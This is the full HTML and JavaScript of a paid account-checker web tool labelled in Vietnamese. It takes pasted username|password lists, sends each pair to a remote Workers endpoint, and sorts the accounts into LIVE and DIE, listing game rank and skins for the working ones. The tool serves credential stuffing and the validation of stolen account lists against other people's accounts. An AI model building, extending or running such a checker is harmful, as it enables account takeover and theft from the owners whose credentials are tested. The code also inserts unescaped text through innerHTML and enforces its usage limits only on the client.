<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ultima Check Tool - Premium</title>
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Roboto+Mono:wght@400;500&display=swap" rel="stylesheet">
    
    <script>
        const userSession = sessionStorage.getItem('ULTIMA_CURRENT_USER');
        if (!userSession) {
            window.location.href = "login.html";
        }
    </script>

    <style>
        /* CSS gi·ªØ nguy√™n style c≈©, ch·ªâ x√≥a ph·∫ßn Login Overlay */
        :root {
            --bg: #0a0b10;
            --panel: #13151b;
            --primary: #00f2ff;
            --success: #00ff9d;
            --error: #ff0055;
            --text: #e0e6ed;
            --border: #2a2f3d;
        }
        * { box-sizing: border-box; outline: none; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 30px; background: rgba(19, 21, 27, 0.9); border-bottom: 1px solid var(--border); backdrop-filter: blur(10px); }
        .logo { font-size: 24px; font-weight: 800; color: var(--primary); text-transform: uppercase; letter-spacing: 2px; }
        
        .user-panel { display: flex; gap: 20px; align-items: center; }
        .stat-box { background: #000; padding: 5px 15px; border-radius: 4px; border: 1px solid var(--border); font-family: 'Roboto Mono', monospace; font-size: 14px; }
        .stat-box span { color: var(--primary); font-weight: bold; }
        
        .btn-logout { background: transparent; border: 1px solid var(--error); color: var(--error); padding: 5px 10px; border-radius: 4px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        .btn-logout:hover { background: var(--error); color: white; }

        .main-container { display: flex; flex: 1; padding: 20px; gap: 20px; height: calc(100vh - 70px); }
        .input-section { flex: 1; display: flex; flex-direction: column; gap: 15px; max-width: 400px; }
        .glass-panel { background: var(--panel); border: 1px solid var(--border); border-radius: 12px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); display: flex; flex-direction: column; height: 100%; }
        
        h3 { margin: 0 0 15px 0; color: var(--text); font-size: 18px; text-transform: uppercase; border-left: 4px solid var(--primary); padding-left: 10px; }
        textarea { flex: 1; background: #08090c; border: 1px solid var(--border); color: #a0aec0; padding: 15px; resize: none; border-radius: 8px; font-family: 'Roboto Mono', monospace; font-size: 13px; line-height: 1.5; }
        textarea:focus { border-color: var(--primary); color: white; }
        
        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
        button.action-btn { flex: 1; padding: 15px; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; text-transform: uppercase; font-size: 16px; transition: 0.2s; }
        .btn-start { background: linear-gradient(135deg, #00b4db 0%, #0083b0 100%); color: white; }
        .btn-start:hover { box-shadow: 0 6px 20px rgba(0, 180, 219, 0.5); }
        
        .output-section { flex: 2; display: flex; flex-direction: column; height: 100%; }
        .result-list { flex: 1; overflow-y: auto; padding-right: 5px; display: flex; flex-direction: column; gap: 8px; }
        
        .res-item { background: #1a1d26; padding: 12px 15px; border-radius: 6px; border-left: 4px solid #555; font-family: 'Roboto Mono', monospace; font-size: 13px; display: flex; align-items: center; justify-content: space-between; }
        .res-item.success { border-left-color: var(--success); background: rgba(0, 255, 157, 0.05); }
        .res-item.error { border-left-color: var(--error); background: rgba(255, 0, 85, 0.05); color: #ff88a0; }
        
        .summary-bar { margin-top: 15px; padding: 15px; background: #13151b; border-radius: 8px; display: flex; justify-content: space-between; border: 1px solid var(--border); font-weight: bold; }
        .sum-ok { color: var(--success); }
        .sum-fail { color: var(--error); }
    </style>
</head>
<body>

    <header>
        <div class="logo">‚ö° ULTIMA TOOL</div>
        <div class="user-panel">
            <div class="stat-box">USER: <span id="displayEmail">...</span></div>
            <div class="stat-box">L∆Ø·ª¢T: <span id="displayTurns">0</span></div>
            <button class="btn-logout" onclick="logout()">LOGOUT</button>
        </div>
    </header>

    <div class="main-container">
        <div class="input-section">
            <div class="glass-panel">
                <h3>üì¶ DANH S√ÅCH T√ÄI KHO·∫¢N</h3>
                <textarea id="inputList" placeholder="user|pass&#10;user2|pass2..."></textarea>
                <div class="btn-group">
                    <button id="btnStop" class="action-btn" style="background: #333; display: none;" onclick="stopCheck()">D·ª™NG</button>
                    <button id="btnCheck" class="action-btn btn-start" onclick="startCheck()">B·∫ÆT ƒê·∫¶U CHECK</button>
                </div>
            </div>
        </div>

        <div class="output-section">
            <div class="glass-panel" style="padding: 0; background: transparent; border: none; box-shadow: none;">
                <div class="result-list" id="resultContainer"></div>
                <div class="summary-bar">
                    <div>LIVE: <span id="countOk" class="sum-ok">0</span></div>
                    <div>DIE: <span id="countFail" class="sum-fail">0</span></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // --- LOGIC CH√çNH ---
        // L·∫•y d·ªØ li·ªáu user t·ª´ Login chuy·ªÉn sang
        const currentUser = JSON.parse(sessionStorage.getItem('ULTIMA_CURRENT_USER'));
        
        // Hi·ªÉn th·ªã th√¥ng tin Header
        document.getElementById('displayEmail').innerText = currentUser.email;
        document.getElementById('displayTurns').innerText = currentUser.turns;

        const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; // Link API check c·ªßa b·∫°n
        let isRunning = false;
        let stopSignal = false;
        let stats = { ok: 0, fail: 0 };

        function logout() {
            sessionStorage.removeItem('ULTIMA_CURRENT_USER');
            window.location.href = 'login.html';
        }

        async function startCheck() {
            const textArea = document.getElementById('inputList');
            let lines = textArea.value.split('\n').filter(line => line.trim() !== "");

            if (lines.length === 0) return alert("‚ö†Ô∏è Danh s√°ch tr·ªëng!");
            if (currentUser.turns <= 0) return alert("‚õî H·∫æT L∆Ø·ª¢T! Vui l√≤ng li√™n h·ªá Admin n·∫°p th√™m.");

            isRunning = true;
            stopSignal = false;
            document.getElementById('btnCheck').style.display = 'none';
            document.getElementById('btnStop').style.display = 'block';
            textArea.disabled = true;

            for (let i = 0; i < lines.length; i++) {
                if (stopSignal || currentUser.turns <= 0) break;

                const line = lines[i];
                if (!line.includes('|')) continue;

                const [user, pass] = line.split('|');
                
                // G·ªçi API Check (Gi·∫£ l·∫≠p ho·∫∑c th·∫≠t)
                const result = await checkAccount(user.trim(), pass.trim());
                
                // Tr·ª´ l∆∞·ª£t (Ch·ªâ ·ªü Client ƒë·ªÉ hi·ªÉn th·ªã, th·ª±c t·∫ø n√™n tr·ª´ ·ªü Server)
                currentUser.turns--;
                document.getElementById('displayTurns').innerText = currentUser.turns;

                if (result.status === 'success') {
                    const d = result.data;
                    const oneLine = `${d.username}|${d.password} | Rank: ${d.rank} | Skin: ${d.skin}`;
                    addResult(oneLine, true);
                    stats.ok++;
                    // X√≥a d√≤ng th√†nh c√¥ng
                    textArea.value = textArea.value.replace(line + "\n", "").replace(line, "").trim(); 
                } else {
                    addResult(`${user}|${pass} -> ${result.msg || 'L·ªói'}`, false);
                    stats.fail++;
                }

                document.getElementById('countOk').innerText = stats.ok;
                document.getElementById('countFail').innerText = stats.fail;
                
                // C·∫≠p nh·∫≠t l·∫°i SessionStorage ƒë·ªÉ l∆∞u s·ªë l∆∞·ª£t m·ªõi (n·∫øu load l·∫°i trang kh√¥ng b·ªã m·∫•t s·ªë l∆∞·ª£t v·ª´a tr·ª´)
                sessionStorage.setItem('ULTIMA_CURRENT_USER', JSON.stringify(currentUser));
                
                await new Promise(r => setTimeout(r, 500));
            }
            stopCheck();
        }

        async function checkAccount(account, password) {
            try {
                const response = await fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ account, password })
                });
                return await response.json();
            } catch (e) {
                return { status: 'error', msg: "L·ªói m·∫°ng" };
            }
        }

        function stopCheck() {
            isRunning = false;
            stopSignal = true;
            document.getElementById('btnCheck').style.display = 'block';
            document.getElementById('btnStop').style.display = 'none';
            document.getElementById('inputList').disabled = false;
        }

        function addResult(text, isSuccess) {
            const container = document.getElementById('resultContainer');
            const div = document.createElement('div');
            div.className = `res-item ${isSuccess ? 'success' : 'error'}`;
            div.innerHTML = `<div style="white-space:nowrap; overflow:hidden; text-overflow:ellipsis;">${text}</div>`;
            container.insertBefore(div, container.firstChild);
        }
    </script>
</body>
</html>
